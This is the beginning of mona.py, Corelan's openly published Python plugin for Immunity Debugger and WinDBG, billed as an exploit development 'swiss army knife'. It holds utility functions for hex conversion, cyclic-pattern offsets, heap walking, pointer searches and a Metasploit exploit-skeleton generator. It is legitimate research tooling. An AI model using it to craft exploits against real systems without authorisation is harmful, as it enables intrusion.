"""
 
U{Corelan<https://www.corelan.be>}

Copyright (c) 2011-2012, Peter Van Eeckhoutte - Corelan GCV
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.
    * Neither the name of Corelan nor the
      names of its contributors may be used to endorse or promote products
      derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL PETER VAN EECKHOUTTE OR CORELAN GCV BE LIABLE FOR ANY
DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 
$Revision: 333 $
$Id: mona.py 333 2013-01-21 13:13:33Z corelanc0d3r $ 
"""

__VERSION__ = '2.0'
__REV__ = filter(str.isdigit, '$Revision: 333 $')
__IMM__ = '1.8'
__DEBUGGERAPP__ = ''
arch = 32
win7mode = False

# try:
# 	import debugger
# except:
# 	pass
try:
	import immlib as dbglib
	from immlib import LogBpHook
	__DEBUGGERAPP__ = "Immunity Debugger"
except:		
	try:
		from pykd import *
		import windbglib as dbglib
		from windbglib import LogBpHook
		dbglib.checkVersion()
		arch = dbglib.getArchitecture()
		__DEBUGGERAPP__ = "WinDBG"
	except SystemExit, e:
		print "-Exit."
		import sys
		sys.exit(e)
	except Exception:
		#import traceback
		print "Do not run this script outside of a debugger !"
		#print traceback.format_exc()
		import sys
		exit(1)

import getopt

try:
	#import debugtypes
	#import libdatatype
	from immutils import *
except:
	pass

		
import os
import re
import sys
import types
import random
import shutil
import struct
import string
import types
import urllib
import inspect
import datetime
import binascii
import itertools
import traceback 

from operator import itemgetter
from collections import defaultdict, namedtuple

import cProfile
import pstats

DESC = "Corelan Team exploit development swiss army knife"

#---------------------------------------#
#  Global stuff                         #
#---------------------------------------#	

TOP_USERLAND = 0x7fffffff
g_modules={}
MemoryPageACL={}
global CritCache
global vtableCache
CritCache={}
vtableCache={}
ptr_counter = 0
ptr_to_get = -1
silent = False
ignoremodules = False
noheader = False
dbg = dbglib.Debugger()

if __DEBUGGERAPP__ == "WinDBG":
	if dbglib.getSymbolPath().replace(" ","") == "":
		dbg.log("")
		dbg.log("** Warning, no symbol path set ! ** ",highlight=1)
		sympath = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"
		dbg.log("   I'll set the symbol path to %s" % sympath)
		dbglib.setSymbolPath(sympath)
		dbg.log("   Symbol path set, now reloading symbols...")
		dbg.nativeCommand(".reload")
		dbg.log("   All set. Please restart WinDBG.")
		dbg.log("")

osver = dbg.getOsVersion()
if osver in ["6", "7", "8", "vista", "win7", "2008server", "win8"]:
	win7mode = True

#---------------------------------------#
#  Utility functions                    #
#---------------------------------------#	
def toHex(n):
	"""
	Converts a numeric value to hex (pointer to hex)

	Arguments:
	n - the value to convert

	Return:
	A string, representing the value in hex (8 characters long)
	"""
	if arch == 32:
		return "%08x" % n
	if arch == 64:
		return "%016x" % n


def stripExtension(fullname):
	"""
	Removes extension from a filename
	(will only remove the last extension)

	Arguments :
	fullname - the original string

	Return:
	A string, containing the original string without the last extension
	"""
	nameparts = fullname.split(".")
	if len(nameparts) > 1:
		cnt = 0
		modname = ""
		while cnt < len(nameparts)-1:
			modname = modname + nameparts[cnt] + "."
			cnt += 1
		return modname.strip(".")
	return fullname

def toHexByte(n):
	"""
	Converts a numeric value to a hex byte

	Arguments:
	n - the vale to convert (max 255)

	Return:
	A string, representing the value in hex (1 byte)
	"""
	return "%02X" % n

def toAscii(n):
	"""
	Converts a byte to its ascii equivalent. Null byte = space

	Arguments:
	n - A string (2 chars) representing the byte to convert to ascii

	Return:
	A string (one character), representing the ascii equivalent
	"""
	asciiequival = " "
	try:
		if n != "00":
			asciiequival=binascii.a2b_hex(n)
		else:
			asciiequival = " "
	except TypeError:
		asciiequival=" "
	return asciiequival

def hex2bin(pattern):
	"""
	Converts a hex string (\\x??\\x??\\x??\\x??) to real hex bytes

	Arguments:
	pattern - A string representing the bytes to convert 

	Return:
	the bytes
	"""
	pattern = pattern.replace("\\x", "")
	pattern = pattern.replace("\"", "")
	pattern = pattern.replace("\'", "")
	
	return ''.join([binascii.a2b_hex(i+j) for i,j in zip(pattern[0::2],pattern[1::2])])


def bin2hex(binbytes):
	"""
	Converts a binary string to a string of space-separated hexadecimal bytes.
	"""
	return ' '.join('%02x' % ord(c) for c in binbytes)

def bin2hexstr(binbytes):
	"""
	Converts bytes to a string with hex
	
	Arguments:
	binbytes - the input to convert to hex
	
	Return :
	string with hex
	"""
	return ''.join('\\x%02x' % ord(c) for c in binbytes)

def str2js(inputstring):
	"""
	Converts a string to an unicode escaped javascript string
	
	Arguments:
	inputstring - the input string to convert 

	Return :
	string in unicode escaped javascript format
	"""
	length = len(inputstring)
	if length % 2 == 1:
		jsmsg = "Warning : odd size given, js pattern will be truncated to " + str(length - 1) + " bytes, it's better use an even size\n"
		if not silent:
			dbg.logLines(jsmsg,highlight=1)
	toreturn=""
	for thismatch in re.compile("..").findall(inputstring):
		thisunibyte = ""
		for thisbyte in thismatch:
			thisunibyte = "%02x" % ord(thisbyte) + thisunibyte
		toreturn += "%u" + thisunibyte
	return toreturn		
	
	
def opcodesToHex(opcodes):
	"""
	Converts pairs of chars (opcode bytes) to hex string notation

	Arguments :
	opcodes : pairs of chars
	
	Return :
	string with hex
	"""
	toreturn = []
	opcodes = opcodes.replace(" ","")
	
	for cnt in range(0, len(opcodes), 2):
		thisbyte = opcodes[cnt:cnt+2]
		toreturn.append("\\x" + thisbyte)
	toreturn = ''.join(toreturn)
	return toreturn
	
	
def rmLeading(input,toremove,toignore=""):
	"""
	Removes leading characters from an input string
	
	Arguments:
	input - the input string
	toremove - the character to remove from the begin of the string
	toignore - ignore this character
	
	Return:
	the input string without the leading character(s)
	"""
	newstring = ""
	cnt = 0
	while cnt < len(input):
		if input[cnt] != toremove and input[cnt] != toignore:
			break
		cnt += 1
	newstring = input[cnt:]
	return newstring

	
def getVersionInfo(filename):
	"""Retrieves version and revision numbers from a mona file
	
	Arguments : filename
	
	Return :
	version - string with version (or empty if not found)
	revision - string with revision (or empty if not found)
	"""

	file = open(filename,"rb")
	content = file.readlines()
	file.close()

	
	revision = ""
	version = ""
	for line in content:
		if line.startswith("$Revision"):
			parts = line.split(" ")
			if len(parts) > 1:
				revision = parts[1].replace("$","")
		if line.startswith("__VERSION__"):
			parts = line.split("=")
			if len(parts) > 1:
				version = parts[1].strip()
	return version,revision

	
def toniceHex(data,size):
	"""
	Converts a series of bytes into a hex string, 
	newline after 'size' nr of bytes
	
	Arguments :
	data - the bytes to convert
	size - the number of bytes to show per linecache
	
	Return :
	a multiline string
	"""
	flip = 1
	thisline = "\""
	block = ""
	
	for cnt in xrange(len(data)):
		thisline += "\\x%s" % toHexByte(ord(data[cnt]))				
		if (flip == size) or (cnt == len(data)-1):				
			thisline += "\""
			flip = 0
			block += thisline 
			block += "\n"
			thisline = "\""
		cnt += 1
		flip += 1
	return block.lower()
	
def hexStrToInt(inputstr):
	"""
	Converts a string with hex bytes to a numeric value
	Arguments:
	inputstr - A string representing the bytes to convert. Example : 41414141

	Return:
	the numeric value
	"""
	valtoreturn = 0
	try:
		valtoreturn = int(inputstr, 16)
	except:
		valtoreturn = 0
	return valtoreturn

	
def toSize(toPad,size):
	"""
	Adds spaces to a string until the string reaches a certain length

	Arguments:
	input - A string
	size - the destination size of the string 

	Return:
	the expanded string of length <size>
	"""
	padded = toPad + " " * (size - len(toPad))
	return padded.ljust(size," ")

	
def toUnicode(input):
	"""
	Converts a series of bytes to unicode (UTF-16) bytes
	
	Arguments :
	input - the source bytes
	
	Return:
	the unicode expanded version of the input
	"""
	unicodebytes = ""
	# try/except, just in case .encode bails out
	try:
		unicodebytes = input.encode('UTF-16LE')
	except:
		inputlst = list(input)
		for inputchar in inputlst:
			unicodebytes += inputchar + '\x00'
	return unicodebytes
	
def toJavaScript(input):
	"""
	Extracts pointers from lines of text
	and returns a javascript friendly version
	"""
	alllines = input.split("\n")
	javascriptversion = ""
	allbytes = ""
	for eachline in alllines:
		thisline = eachline.replace("\t","").lower().strip()
		if not(thisline.startswith("#")):
			if thisline.startswith("0x"):
				theptr = thisline.split(",")[0].replace("0x","")
				# change order to unescape format
				if arch == 32:
					byte1 = theptr[0] + theptr[1]
					byte2 = theptr[2] + theptr[3]
					byte3 = theptr[4] + theptr[5]
					byte4 = theptr[6] + theptr[7]
					allbytes += hex2bin("\\x" + byte4 + "\\x" + byte3 + "\\x" + byte2 + "\\x" + byte1)
				if arch == 64:
					byte1 = theptr[0] + theptr[1]
					byte2 = theptr[2] + theptr[3]
					byte3 = theptr[4] + theptr[5]
					byte4 = theptr[6] + theptr[7]
					byte5 = theptr[8] + theptr[9]
					byte6 = theptr[10] + theptr[11]
					byte7 = theptr[12] + theptr[13]
					byte8 = theptr[14] + theptr[15]
					allbytes += hex2bin("\\x" + byte8 + "\\x" + byte7 + "\\x" + byte6 + "\\x" + byte5)
					allbytes += hex2bin("\\x" + byte4 + "\\x" + byte3 + "\\x" + byte2 + "\\x" + byte1)
	javascriptversion = str2js(allbytes)			
	return javascriptversion
	
	
def isReg(reg):
	"""
	Checks if a given string is a valid reg
	Argument :
	reg  - the register to check
	
	Return:
	Boolean
	"""
	regs = []
	if arch == 32:
		regs=["eax","ebx","ecx","edx","esi","edi","ebp","esp"]
	if arch == 64:
		regs=["rax","rbx","rcx","rdx","rsi","rdi","rbp","rsp", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
	return str(reg).lower() in regs
	

def isAddress(string):
	"""
	Check if a string is an address / consists of hex chars only

	Arguments:
	string - the string to check

	Return:
	Boolean - True if the address string only contains hex bytes
	"""
	string = string.replace("\\x","")
	if len(string) > 16:
		return False
	for char in string:
		if char.upper() not in ["A","B","C","D","E","F","1","2","3","4","5","6","7","8","9","0"]:
			return False
	return True
	
def isHexValue(string):
	"""
	Check if a string is a hex value / consists of hex chars only (and - )

	Arguments:
	string - the string to check

	Return:
	Boolean - True if the address string only contains hex bytes or - sign
	"""
	string = string.replace("\\x","")
	string = string.replace("0x","")
	if len(string) > 16:
		return False
	for char in string:
		if char.upper() not in ["A","B","C","D","E","F","1","2","3","4","5","6","7","8","9","0","-"]:
			return False
	return True	
	
	

def addrToInt(string):
	"""
	Convert a textual address to an integer

	Arguments:
	string - the address

	Return:
	int - the address value
	"""
	
	string = string.replace("\\x","")
	return hexStrToInt(string)
	
def splitAddress(address):
	"""
	Splits aa dword/qdword into individual bytes (4 or 8 bytes)

	Arguments:
	address - The string to split

	Return:
	4 or 8 bytes
	"""
	if arch == 32:
		byte1 = address >> 24 & 0xFF
		byte2 = address >> 16 & 0xFF
		byte3 = address >>  8 & 0xFF
		byte4 = address & 0xFF
		return byte1,byte2,byte3,byte4

	if arch == 64:
		byte1 = address >> 56 & 0xFF
		byte2 = address >> 48 & 0xFF
		byte3 = address >> 40 & 0xFF
		byte4 = address >> 32 & 0xFF
		byte5 = address >> 24 & 0xFF
		byte6 = address >> 16 & 0xFF
		byte7 = address >>  8 & 0xFF
		byte8 = address & 0xFF
		return byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8


def bytesInRange(address, range):
	"""
	Checks if all bytes of an address are in a range

	Arguments:
	address - the address to check
	range - a range object containing the values all bytes need to comply with

	Return:
	a boolean
	"""
	if arch == 32:
		byte1,byte2,byte3,byte4 = splitAddress(address)
		
		# if the first is a null we keep the address anyway
		if not (byte1 == 0 or byte1 in range):
			return False
		elif not byte2 in range:
			return False
		elif not byte3 in range:
			return False
		elif not byte4 in range:
			return False

	if arch == 64:
		byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8 = splitAddress(address)
		
		# if the first is a null we keep the address anyway
		if not (byte1 == 0 or byte1 in range):
			return False
		elif not byte2 in range:
			return False
		elif not byte3 in range:
			return False
		elif not byte4 in range:
			return False
		elif not byte5 in range:
			return False
		elif not byte6 in range:
			return False
		elif not byte7 in range:
			return False
		elif not byte8 in range:
			return False
	
	return True

def readString(address):
	"""
	Reads a string from the given address until it reaches a null bytes

	Arguments:
	address - the base address (integer value)

	Return:
	the string
	"""
	toreturn = dbg.readString(address)
	return toreturn

def getSegmentEnd(segmentstart):
	os = dbg.getOsVersion()
	offset = 0x24
	if win7mode:
		offset = 0x28
	segmentend = struct.unpack('<L',dbg.readMemory(segmentstart + offset,4))[0]
	return segmentend


def getHeapFlag(flag):
	flags = {
	0x0 : "Free",
	0x1 : "Busy",
	0x2 : "Extra present",
	0x4 : "Fill pattern",
	0x8 : "Virtallocd",
	0x10 : "Last",
	0x20 : "FFU-1",
	0x40 : "FFU-2",
	0x80 : "No Coalesce"
	}
	if win7mode:
		flags[0x8] = "Internal"
	if flag in flags:
		return flags[flag]
	else:
		# maybe it's a combination of flags
		values = [0x80, 0x40, 0x20, 0x10, 0x8, 0x4, 0x2, 0x1]
		flagtext = []
		for val in values:
			if (flag - val) >= 0:
				flagtext.append(flags[val])
				flag -= val
		if len(flagtext) == 0:
			flagtext = "Unknown"
		else:
			flagtext = ','.join(flagtext)
		return flagtext


def walkSegment(FirstEntry,LastValidEntry,key=0):
	thisblock = FirstEntry
	allblocksfound = False
	allblocks = {}
	nextblock = thisblock
	cnt = 0
	savedprevsize = 0
	while not allblocksfound:
		thissize = 0
		prevsize = 0
		flags = 0
		unused = 0
		headersize = 0x8
		if win7mode:
			headersize = 0x8
		try:
			if key == 0 and not win7mode:
				sizebytes = dbg.readMemory(thisblock,2)
				prevsizebytes = dbg.readMemory(thisblock+2,2)
				thissize = struct.unpack('<H',sizebytes)[0]
				#prevsize = struct.unpack('<H',prevsizebytes)[0]
				flags = struct.unpack('<B',dbg.readMemory(thisblock+5,1))[0]
				unused = struct.unpack('<B',dbg.readMemory(thisblock+6,1))[0]
				if savedprevsize == 0:
					prevsize = 0
					savedprevsize = thissize*8
				else:
					prevsize = savedprevsize
					savedprevsize = thissize*8				
			else:
				# get header and decode first 4 bytes
				blockcnt = 0
				fullheaderbytes = ""
				while blockcnt < headersize:
					header = struct.unpack('<L',dbg.readMemory(thisblock+blockcnt,4))[0]
					if blockcnt == 0:
						decodedheader = header ^ key
					else:
						decodedheader = header
					headerbytes = "%08x" % decodedheader
					bytecnt = 7
					while bytecnt >= 0:
						fullheaderbytes = fullheaderbytes + headerbytes[bytecnt-1] + headerbytes[bytecnt]
						bytecnt -= 2
					blockcnt += 4
				fullheaderbin = hex2bin(fullheaderbytes)
				sizebytes = fullheaderbin[0:2]
				flags = struct.unpack('<B',fullheaderbin[2:3])[0]
				prevsizebytes = fullheaderbin[4:6]
				thissize = struct.unpack('<H',sizebytes)[0]
				if savedprevsize == 0:
					prevsize = 0
					savedprevsize = thissize*8
				else:
					prevsize = savedprevsize
					savedprevsize = thissize*8
				unused = struct.unpack('<B',fullheaderbin[7:8])[0]
		except:
			thissize = 0
			prevsize = 0
			flags = 0
			unused = 0
		if thissize > 0:
			nextblock = thisblock + (thissize * 8)
		else:
			nextblock += headersize
		if "virtall" in getHeapFlag(flags).lower() or "internal" in getHeapFlag(flags).lower():
			headersize = 0x20
		if not thisblock in allblocks and thissize > 0:
			allblocks[thisblock] = [prevsize,thissize,flags,unused,headersize,prevsize]
		thisblock = nextblock
		if nextblock >= LastValidEntry:
			allblocksfound = True
		if "last" in getHeapFlag(flags).lower():
			allblocksfound = True
		cnt += 1
	return allblocks

	
def getStacks():
	"""
	Retrieves all stacks from all threads in the current application

	Arguments:
	None

	Return:
	a dictionary, with key = threadID. Each entry contains an array with base and top of the stack
	"""
	stacks = {}
	threads = dbg.getAllThreads() 
	for thread in threads:
		teb = thread.getTEB()
		tid = thread.getId()
		topStack = 0
		baseStack = 0
		if arch == 32:
			topStack = struct.unpack('<L',dbg.readMemory(teb+4,4))[0]
			baseStack = struct.unpack('<L',dbg.readMemory(teb+8,4))[0]
		if arch == 64:
			topStack = struct.unpack('<Q',dbg.readMemory(teb+8,8))[0]
			baseStack = struct.unpack('<Q',dbg.readMemory(teb+16,8))[0]
		stacks[tid] = [baseStack,topStack]
	return stacks

def meetsAccessLevel(page,accessLevel):
	"""
	Checks if a given page meets a given access level

	Arguments:
	page - a page object
	accesslevel - a string containing one of the following access levels :
	R,W,X,RW,RX,WR,WX,RWX or *

	Return:
	a boolean
	"""
	if "*" in accessLevel:
		return True
	
	pageAccess = page.getAccess(human=True)
	
	if "-R" in accessLevel:
		if "READ" in pageAccess:
			return False
	if "-W" in accessLevel:
		if "WRITE" in pageAccess:
			return False
	if "-X" in accessLevel:
		if "EXECUTE" in pageAccess:
			return False
	if "R" in accessLevel:
		if not "READ" in pageAccess:
			return False
	if "W" in accessLevel:
		if not "WRITE" in pageAccess:
			return False
	if "X" in accessLevel:
		if not "EXECUTE" in pageAccess:
			return False
			
	return True

def splitToPtrInstr(input):
	"""
	Splits a line (retrieved from a mona output file) into a pointer and a string with the instructions in the file

	Arguments:
	input : the line containing pointer and instruction

	Return:
	a pointer - (integer value)
	a string - instruction
	if the input does not contain a valid line, pointer will be set to -1 and string will be empty
	"""	
	
	thispointer = -1
	thisinstruction = ""
	split1 = re.compile(" ")
	split2 = re.compile(":")
	split3 = re.compile("\*\*")
	
	thisline = input.lower()
	if thisline.startswith("0x"):
		#get the pointer
		parts = split1.split(input)
		if len(parts[0]) != 10:
			return thispointer,thisinstruction
		else:
			thispointer = hexStrToInt(parts[0])
			if len(parts) > 1:
				subparts = split2.split(input)
				subpartsall = ""
				if len(subparts) > 1:
					cnt = 1
					while cnt < len(subparts):
						subpartsall += subparts[cnt] + ":"
						cnt +=1
					subsubparts = split3.split(subpartsall)
					thisinstruction = subsubparts[0].strip()
			return thispointer,thisinstruction
	else:
		return thispointer,thisinstruction
		
		
def getNrOfDictElements(thisdict):
	"""
	Will get the total number of entries in a given dictionary
	Argument: the source dictionary
	Output : an integer
	"""
	total = 0
	for dicttype in thisdict:
		for dictval in thisdict[dicttype]:
			total += 1
	return total
	
def getModuleObj(modname):
	"""
	Will return a module object if the provided module name exists
	Will perform a case sensitive search first,
	and then a case insensitive search in case nothing was found
	"""
	# Method 1
	mod = dbg.getModule(modname)
	if mod is not None:
		return mod
	# Method 2
	allmod = dbg.getAllModules()
	if not modname.endswith(".dll"):
		modname += ".dll"
	for tmod in allmod:
		if tmod.getName() == modname:
			return tmod
	# Method 3
	for tmod in allmod:
		if tmod.getName().lower() == modname.lower():
			return tmod
	return None
	
		
		
def getPatternLength(startptr,type="normal",args={}):
	"""
	Gets length of a cyclic pattern, starting from a given pointer
	
	Arguments:
	startptr - the start pointer (integer value)
	type - optional string, indicating type of pattern :
		"normal" : normal pattern
		"unicode" : unicode pattern
		"upper" : uppercase pattern
		"lower" : lowercase pattern
	"""
	patternsize = 0
	endofpattern = False
	global silent
	oldsilent=silent
	silent=True
	fullpattern = createPattern(200000,args)
	silent=oldsilent
	if type == "upper":
		fullpattern = fullpattern.upper()
	if type == "lower":
		fullpattern = fullpattern.lower()
	#if type == "unicode":
	#	fullpattern = toUnicode(fullpattern)
	
	if type in ["normal","upper","lower","unicode"]:
		previousloc = -1
		while not endofpattern and patternsize <= len(fullpattern):
			sizemeter=dbg.readMemory(startptr+patternsize,4)
			if type == "unicode":
				sizemeter=dbg.readMemory(startptr+patternsize,8)
				sizemeter = sizemeter.replace('\x00','')
			else:
				sizemeter=dbg.readMemory(startptr+patternsize,4)
			if len(sizemeter) == 4:
				thisloc = fullpattern.find(sizemeter)
				if thisloc < 0 or thisloc <= previousloc:
					endofpattern = True
				else:
					patternsize += 4
					previousloc = thisloc
			else:
				return patternsize
		#maybe this is not the end yet
		patternsize -= 8
		endofpattern = False
		while not endofpattern and patternsize <= len(fullpattern):
			sizemeter=dbg.readMemory(startptr+patternsize,4)
			if type == "unicode":
				sizemeter=dbg.readMemory(startptr+patternsize,8)
				sizemeter = sizemeter.replace('\x00','')
			else:
				sizemeter=dbg.readMemory(startptr+patternsize,4)
			if fullpattern.find(sizemeter) < 0:
				patternsize += 3
				endofpattern = True
			else:		
				patternsize += 1
	if type == "unicode":
		patternsize = (patternsize / 2) + 1
	return patternsize
	
def getAPointer(modules,criteria,accesslevel):
	"""
	Gets the first pointer from one of the supplied module that meets a set of criteria
	
	Arguments:
	modules - array with module names
	criteria - dictionary describing the criteria the pointer needs to comply with
	accesslevel - the required access level
	
	Return:
	a pointer (integer value) or 0 if nothing was found
	"""
	pointer = 0
	dbg.getMemoryPages()
	for a in dbg.MemoryPages.keys():
			page_start = a
			page_size  = dbg.MemoryPages[a].getSize()
			page_end   = a + page_size
			#page in one of the modules ?
			if meetsAccessLevel(dbg.MemoryPages[a],accesslevel):
				pageptr = MnPointer(a)
				thismodulename = pageptr.belongsTo()
				if thismodulename != "" and thismodulename in modules:
					thismod = MnModule(thismodulename)
					start = thismod.moduleBase
					end = thismod.moduleTop
					random.seed()
					for cnt in xrange(page_size+1):
						#randomize the value
						theoffset = random.randint(0,page_size)
						thispointer = MnPointer(page_start + theoffset)
						if meetsCriteria(thispointer,criteria):
							return page_start + theoffset
	return pointer
	
	
def haveRepetition(string, pos):
	first =  string[pos]
	MIN_REPETITION = 3		
	if len(string) - pos > MIN_REPETITION:
		count = 1
		while ( count < MIN_REPETITION and string[pos+count] ==  first):
			count += 1
		if count >= MIN_REPETITION:
			return True
	return False

def isAsciiString(data):
	"""
	Check if a given string only contains ascii characters
	"""
	return all((ord(c) >= 32 and ord(c) <= 127) for c in data)
	
def isAscii(b):
	"""
	Check if a given hex byte is ascii or not
	
	Argument : the byte
	Returns : Boolean
	"""
	return b == 0x0a or b == 0x0d or (b >= 0x20 and b <= 0x7e)
	
def isAscii2(b):
	"""
	Check if a given hex byte is ascii or not, will not flag newline or carriage return as ascii
	
	Argument : the byte
	Returns : Boolean
	"""
	return b >= 0x20 and b <= 0x7e	
	
def isHexString(input):
	"""
	Checks if all characters in a string are hex (0->9, a->f, A->F)
	Alias for isAddress()
	"""
	return isAddress(input)

def extract_chunks(iterable, size):
	""" Retrieves chunks of the given :size from the :iterable """
	fill = object()
	gen = itertools.izip_longest(fillvalue=fill, *([iter(iterable)] * size))
	return (tuple(x for x in chunk if x != fill) for chunk in gen)

def rrange(x, y = 0):
	""" Creates a reversed range (from x - 1 down to y).
	
	Example:
	>>> rrange(10, 0) # => [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]
	"""
	return range(x - 1, y - 1, -1)

def getSkeletonHeader(exploittype,portnr,extension,url,badchars='\x00\x0a\x0d'):

	originalauthor = "insert_name_of_person_who_discovered_the_vulnerability"
	name = "insert name for the exploit"
	cve = "insert CVE number here"
	
	if url == "":
		url = "<insert another link to the exploit/advisory here>"
	else:
		try:
			# connect to url & get author + app description
			u = urllib.urlretrieve(url)
			# extract title
			fh = open(u[0],'r')
			contents = fh.readlines()
			fh.close()
			for line in contents:
				if line.find('<h1') > -1:
					titleline = line.split('>')
					if len(titleline) > 1:
						name = titleline[1].split('<')[0].replace("\"","").replace("'","").strip()
					break
			for line in contents:
				if line.find('Author:') > -1 and line.find('td style') > -1:
					authorline = line.split("Author:")
					if len(authorline) > 1:
						originalauthor = authorline[1].split('<')[0].replace("\"","").replace("'","").strip()
					break
			for line in contents:
				if line.find('CVE:') > -1 and line.find('td style') > -1:
					cveline = line.split("CVE:")
					if len(cveline) > 1:
						tcveparts = cveline[1].split('>')
						if len(tcveparts) > 1:
							tcve = tcveparts[1].split('<')[0].replace("\"","").replace("'","").strip()
							if tcve.upper().strip() != "N//A":
								cve = tcve
					break					
		except:
			dbg.log(" ** Unable to download %s" % url,highlight=1)
			url = "<insert another link to the exploit/advisory here>"
	
	monaConfig = MnConfig()
	thisauthor = monaConfig.get("author")
	if thisauthor == "":
		thisauthor = "<insert your name here>"

	skeletonheader = "##\n"
	skeletonheader += "# This file is part of the Metasploit Framework and may be subject to\n"
	skeletonheader += "# redistribution and commercial restrictions. Please see the Metasploit\n"
	skeletonheader += "# Framework web site for more information on licensing and terms of use.\n"
	skeletonheader += "#   http://metasploit.com/framework/\n"
	skeletonheader += "##\n\n"
	skeletonheader += "require 'msf/core'\n\n"
	skeletonheader += "class Metasploit3 < Msf::Exploit::Remote\n"
	skeletonheader += "\t#Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking\n"
	skeletonheader += "\t#ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking\n"
	skeletonheader += "\tRank = NormalRanking\n\n"
	
	if exploittype == "fileformat":
		skeletonheader += "\tinclude Msf::Exploit::FILEFORMAT\n"
	if exploittype == "network client (tcp)":
		skeletonheader += "\tinclude Msf::Exploit::Remote::Tcp\n"
	if exploittype == "network client (udp)":
		skeletonheader += "\tinclude Msf::Exploit::Remote::Udp\n"
		
	if cve.strip() == "":
		cve = "<insert CVE number here>"
		
	skeletoninit = "\tdef initialize(info = {})\n"
	skeletoninit += "\t\tsuper(update_info(info,\n"
	skeletoninit += "\t\t\t'Name'\t\t=> '" + name + "',\n"
	skeletoninit += "\t\t\t'Description'\t=> %q{\n"
	skeletoninit += "\t\t\t\t\tProvide information about the vulnerability / explain as good as you can\n"
	skeletoninit += "\t\t\t\t\tMake sure to keep each line less than 100 columns wide\n"
	skeletoninit += "\t\t\t},\n"
	skeletoninit += "\t\t\t'License'\t\t=> MSF_LICENSE,\n"
	skeletoninit += "\t\t\t'Author'\t\t=>\n"
	skeletoninit += "\t\t\t\t[\n"
	skeletoninit += "\t\t\t\t\t'" + originalauthor + "<user[at]domain.com>',\t# Original discovery\n"
	skeletoninit += "\t\t\t\t\t'" + thisauthor + "',\t# MSF Module\n"		
	skeletoninit += "\t\t\t\t],\n"
	skeletoninit += "\t\t\t'References'\t=>\n"
	skeletoninit += "\t\t\t\t[\n"
	skeletoninit += "\t\t\t\t\t[ 'OSVDB', '<insert OSVDB number here>' ],\n"
	skeletoninit += "\t\t\t\t\t[ 'CVE', '" + cve + "' ],\n"
	skeletoninit += "\t\t\t\t\t[ 'URL', '" + url + "' ]\n"
	skeletoninit += "\t\t\t\t],\n"
	skeletoninit += "\t\t\t'DefaultOptions' =>\n"
	skeletoninit += "\t\t\t\t{\n"
	skeletoninit += "\t\t\t\t\t'ExitFunction' => 'process', #none/process/thread/seh\n"
	skeletoninit += "\t\t\t\t\t#'InitialAutoRunScript' => 'migrate -f',\n"	
	skeletoninit += "\t\t\t\t},\n"
	skeletoninit += "\t\t\t'Platform'\t=> 'win',\n"
	skeletoninit += "\t\t\t'Payload'\t=>\n"
	skeletoninit += "\t\t\t\t{\n"
	skeletoninit += "\t\t\t\t\t'BadChars' => \"" + bin2hexstr(badchars) + "\", # <change if needed>\n"
	skeletoninit += "\t\t\t\t\t'DisableNops' => true,\n"
	skeletoninit += "\t\t\t\t},\n"
	
	skeletoninit2 = "\t\t\t'Privileged'\t=> false,\n"
	skeletoninit2 += "\t\t\t#Correct Date Format: \"M D Y\"\n"
	skeletoninit2 += "\t\t\t#Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec\n"
	skeletoninit2 += "\t\t\t'DisclosureDate'\t=> 'MONTH DAY YEAR',\n"
	skeletoninit2 += "\t\t\t'DefaultTarget'\t=> 0))\n"
	
	if exploittype.find("network") > -1:
		skeletoninit2 += "\n\t\tregister_options([Opt::RPORT(" + str(portnr) + ")], self.class)\n"
	if exploittype.find("fileformat") > -1:
		skeletoninit2 += "\n\t\tregister_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf" + extension + "']),], self.class)\n"
	skeletoninit2 += "\n\tend\n\n"
	
	return skeletonheader,skeletoninit,skeletoninit2

#---------------------------------------#
#   Class to call commands & parse args #
#---------------------------------------#

class MnCommand:
	"""
	Class to call commands, show usage and parse arguments
	"""
	def __init__(self, name, description, usage, parseProc, alias=""):
		self.name = name
		self.description = description
		self.usage = usage
		self.parseProc = parseProc
		self.alias = alias

		
		
#---------------------------------------#
#   Class to perform call tracing       #
#---------------------------------------#

class MnCallTraceHook(LogBpHook):
	def __init__(self, callptr, showargs, instruction, logfile):
		LogBpHook.__init__(self)
		self.callptr = callptr
		self.showargs = showargs
		self.logfile = logfile
		self.instruction = instruction
	
	def run(self,regs):
		# get instruction at this address
		thisaddress = regs["EIP"]
		thisinstruction = self.instruction
		allargs = []
		argstr = ""
		if thisinstruction.startswith("CALL "):
			if self.showargs > 0:
				for cnt in xrange(self.showargs):
					thisarg = 0
					try:
						thisarg = struct.unpack('<L',dbg.readMemory(regs["ESP"]+(cnt*4),4))[0]
					except:
						thisarg = 0
					allargs.append(thisarg)
					argstr += "0x%08x, " % thisarg
				argstr = argstr.strip(" ")
				argstr = argstr.strip(",")
				#dbg.log("CallTrace : 0x%08x : %s (%s)" % (thisaddress,thisinstruction,argstr),address = thisaddress)
